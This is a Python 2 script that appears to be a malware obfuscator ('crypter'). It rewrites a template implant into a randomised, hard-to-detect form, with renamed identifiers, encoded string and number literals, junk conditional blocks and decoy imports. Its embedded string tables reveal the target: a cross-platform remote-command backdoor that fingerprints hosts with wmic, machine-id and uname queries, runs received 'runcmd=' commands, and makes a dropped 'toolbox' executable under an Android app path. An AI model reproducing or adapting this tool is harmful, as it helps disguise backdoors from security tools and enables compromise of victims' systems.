import ast, traceback, random
from random import shuffle
import sys



common_libraries = ["abc", "argparse", "base64", "collections", "copy", "csv", "datetime", "decimal", "functools", "hashlib", "importlib", "itertools", "inspect", "json", "logging", "math", "os", "pdb", "random", "re", "sys", "types", "unittest"]
gen_src = ""


get_str = lambda l: "".join([random.choice("abcdefghijklmnopqrstuvwxyz") for i in range(l)])
get_binop = lambda : random.choice(['>', '<', '==', '>=', '<='])
get_op = lambda : random.choice(['and', 'or'])


def gen_num(n):
	arr_t = [random.choice(["-", "+"]) + str(random.randint(0, 100)) for i in range(random.randint(3,10))]
	sum_arr = ("+"+str(sum(map(int, arr_t))*-1)).replace("+-", "-")
	n = n + int(arr_t[0])
	arr_t = arr_t[1:]
	resp = [("+"+str(n)).replace("+-", "-"), sum_arr] + arr_t
	shuffle(resp)
	resp_str = "".join(resp)
	resp_0 = "" if resp_str[0]=="+" else "-"
	return resp_0 + resp_str[1:]



def gen_str(str_):
	rand_padding = random.randint(0,1)
	if rand_padding:
		rand_ind = random.randint(0, len(str_)-1)
		rand_str = get_str(random.randint(10,20))
		str_ = str_[:rand_ind] + rand_str + str_[rand_ind:]
	seq_arr = [random.randint(5, 15) for i in range(len(str_))]
	str_arr = [get_str(seq_arr[i]) + str_[i] + get_str(random.randint(5, 15)) for i in range(len(str_))]
	len_arr = len(str_arr)
	ind_for = random.choice("abcdefghijklmnopqrstuvwxyz")
	resp = "''.join([{}[{}][{}[{}]] for {} in range({})])".format(str_arr, ind_for, seq_arr, ind_for, ind_for, len_arr)
	resp += ".replace('{}', '')".format(rand_str) if rand_padding else ""
	return resp



def ast_attr_recur(ast_attr, s=""):
	s = ast_attr.attr + '.' + s if len(s) else ast_attr.attr
	if isinstance(ast_attr.value, ast.Name):
		return ast_attr.value.id + '.' + s
	elif isinstance(ast_attr.value, ast.Attribute):
		return ast_attr_recur(ast_attr.value, s)



def ast_call_recur(ast_call):
	if isinstance(ast_call.func, ast.Name):
		arg_arr = []
		for arg_ in ast_call.args:
			if isinstance(arg_, ast.Call):
				arg_arr.append(ast_call_recur(arg_))
			else:
				arg_arr.append(arg_)
		return ['Call->ast', ast_call.func.id, arg_arr]
	elif isinstance(ast_call.func, ast.Attribute):
		return [ast_attr_recur(ast_call.func), []]



def assign_recur(ast_t):
	if isinstance(ast_t, ast.BinOp):
		if isinstance(ast_t.right, ast.Str):
			if random.randint(0,1):
				right_s = gen_str(ast_t.right.s)
			else:
				right_s = "'{}'".format(str(ast_t.right.s))
		elif isinstance(ast_t.right, ast.Num):
			right_s = gen_num(ast_t.right.n)
		return "{}assign_recur{}".format(assign_recur(ast_t.left), right_s).replace("+-", "-")
	elif isinstance(ast_t, ast.Str):
		if random.randint(0, 1):
			left_s = gen_str(ast_t.s)
		else:
			left_s = "'{}'".format(str(ast_t.s))
	elif isinstance(ast_t, ast.Num):
		left_s = gen_num(ast_t.n)
	return left_s



def unpack_assign(ast_val):
	var_arr = []
	if isinstance(ast_val, ast.Str):
		s = ast_val.s
		n = []
		while sum(n)<len(s):
			n.append(random.randint(1, len(s)-sum(n)))
		z = assign_recur(compile('crypt_tmp = "' + '"+"'.join([s[sum(n[:i]):sum(n[:i+1])] for i in range(len(n))]) + '"', filename='<unknown>', mode='exec', flags=ast.PyCF_ONLY_AST).body[0].value)
		z_arr = z.split('assign_recur')
		var_arr = []
		for i in z_arr:
			var_arr.append(get_str(random.randint(10,15)))
		return var_arr, '\n'.join(["{} = {}".format(var_arr[i] , z_arr[i]) for i in range(len(z_arr))])
	elif isinstance(ast_val, ast.Num):
		return gen_num(ast_val.n)



def single_assign(cbloc_v, cbloc_k):
	resp = ""
	if isinstance(cbloc_v, ast.Str):
		synt_ = unpack_assign(cbloc_v)
		resp += synt_[1] + '\n'
		resp += "{} = {}\n".format(cbloc_k, '+'.join(synt_[0]))
	elif isinstance(cbloc_v, ast.Num):
		synt_ = unpack_assign(cbloc_v)
		resp += "\n{} = {}\n".format(cbloc_k, synt_)
	return resp




def bloc_assign(cbloc):
	if isinstance(cbloc.value, ast.Str) or isinstance(cbloc.value, ast.Num):
		gen_src.append(single_assign(cbloc.value, cbloc.targets[0].id))
	else:
		gen_src.append(src.split("\n")[cbloc.lineno-1] + '\n')


def null_bloc():
	rbloc_arr = [single_assign(ast.Str(get_str(random.randint(5,10))), get_str(random.randint(5,10))).replace('{null_bloc}', ''), \
	single_assign(ast.Num(random.randint(5,10)), get_str(random.randint(5,10))), "print('{}')\n".format(get_str(random.randint(5,10)))]
	return rbloc_arr[random.randint(0,2)]


def bool_bloc():
	bool_t = "{int} {binop} {int}"
	var_arr, head_s = [], ""
	for i in range(bool_t.count("{int}")):
		if random.randint(0,1):
			var_arr.append(get_str(random.randint(3,6)))
			bool_t = bool_t.replace("{int}", var_arr[-1], 1)
		else:
			bool_t = bool_t.replace("{int}", str(random.randint(3,6)), 1)
	
	for i in var_arr:
		head_s += "{} = {}\n".format(i,  random.randint(0,100))
	bool_t = bool_t.replace("{binop}", get_binop())
	return head_s, bool_t



def if_bloc():
	if_t, head_s = "if ", "\n"
	for i in range(random.randint(1,3)):
		bool_s = bool_bloc()
		head_s += bool_s[0]
		if_t += "({}) {}".format(bool_s[1], get_op())
	if_t = if_t[::-1][if_t[::-1].index(')'):][::-1] + ':\n'
	for i in range(random.randint(1,3)):
		t_bloc = null_bloc()
		if_t +=  '\n'.join(['\t' + i + '\n' for i in t_bloc.split('\n') if len(i)>2])
	return head_s, if_t


def get_null_bloc():
	for i in range(100):
		try:
			r = if_bloc()
			ast.parse(r[0] + '\n' + r[1])
			return r[0] + '\n' + r[1]
		except SyntaxError:
			pass
	print "[-] Failed to encrypt, try again."
	sys.exit(1)




if __name__ == '__main__':

	with open("cryptFrame.layout.tmp", "r") as f:
		src = f.read()
	busy_arr = []
	for i in range(33):
		while True:
			rand_tmp = get_str(random.randint(5,10))
			if rand_tmp not in busy_arr:
				busy_arr.append(rand_tmp)
				break
		src = src.replace("{crypt_var_%d}"%(i+1), busy_arr[-1])
	for i in range(4):
		while True:
			rand_tmp = get_str(random.randint(5,10))
			if rand_tmp not in busy_arr:
				busy_arr.append(rand_tmp)
				break
		src = src.replace("{crypt_func_%d}"%(i+1), busy_arr[-1])


	hash_table_windows_ = ['+', 'plus', '/', 'slash', '=', 'equal', 1, 'sleep', 'timeout', '/data/data/net.orange.bolt/', \
	'-w 10;', '-w 10', 'ping -c', 'ping -n', ' ; ', ' & ', 'elf.out', '{place_var}',\
	'cat ', 'type ', 'echo -e', 10000, 99999, 'echo ', 'IPv4', 'ipconfig', 'ip route', 'wmic path win32_computersystemproduct get uuid', \
	'wmic os get Caption,CSDVersion /value', 'updated', 'runcmd=', '[!] Running: {}', 'timeout']
	hash_table_linux_ = ['User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',\
	'JustKidding', '+', 'plus', '/', 'slash', '=', 'equal', 'utf-8', 'ascii', '/data/data/net.orange.bolt/', 'elf.out', 'toolbox',\
	'cat /etc/machine-id', 'Linux ', 'uname -r', 'updated', 'runcmd=', 7, 'sleep', 52, 0, '/assets/toolbox', '[!] Running: {}', 'chmod +x']

	for hash_table_, platform in [(hash_table_windows_, 'windows'), (hash_table_linux_, 'linux')]:
		hash_table_str = "["
		for i in range(len(hash_table_)):
			if hash_table_[i] != '{place_var}' and isinstance(hash_table_[i], str):
				if random.randint(0,1):
					hash_table_str += gen_str(hash_table_[i]) + ', '
				else:
					hash_table_str += "'{}'".format(hash_table_[i]) + ', '
			elif hash_table_[i] != '{place_var}':
				if random.randint(0,1):
					hash_table_str += gen_num(hash_table_[i]) + ', '
				else:
					hash_table_str += "{}".format(hash_table_[i]) + ', '
			else:
				hash_table_str += "%s"%busy_arr[31] + ', '
		for i in range(random.randint(5,25)):
			if random.randint(0,1):
				hash_table_str += "'{}'".format(get_str(random.randint(5,10))) + ', '
			else:
				hash_table_str += "{}".format(random.randint(0,1000)) + ', '

		hash_table_str = hash_table_str[:-2] + "]"
		src = src.replace("{hash_table_%s_}"%platform, hash_table_str)

	src_tree = compile(src, filename='<unknown>', mode='exec', flags=ast.PyCF_ONLY_AST)
	gen_src = []
	imports_ = []

	for cbloc_i in range(len(src_tree.body)):
		cbloc = src_tree.body[cbloc_i]
		if isinstance(cbloc, ast.Assign):
			bloc_assign(cbloc)
		elif isinstance(cbloc, ast.Import):
			for alias_ in cbloc.names:
				imports_.append(alias_.name)
			imports_ += [random.choice(common_libraries) for j in range(random.randint(0, 4))]
		else:
			gen_src.append('\n')
			try:
				end_pad = src_tree.body[cbloc_i+1].lineno
			except:
				end_pad = len(src.split('\n'))
			for l in range(cbloc.lineno, end_pad):
				gen_src.append(src.split("\n")[l-1] + '\n')
			gen_src.append('\n'*random.randint(1,3))

	imports_ = list(set(imports_))
	shuffle(imports_)
	gen_src.insert(0, 'import ' + '\nimport '.join(imports_) + '\n')
	gen_src = ''.join(gen_src)

	for j in range(0,3):
		for i in range(gen_src.count('"{null_bloc_%d}"'%j)):
			tmp_b = get_null_bloc()
			tmp_b = '\n'.join(['\t'*j + k + '\n' for k in tmp_b[:].split('\n')])
			gen_src = gen_src.replace('"{null_bloc_%d}"'%j, tmp_b, 1)

	print gen_src
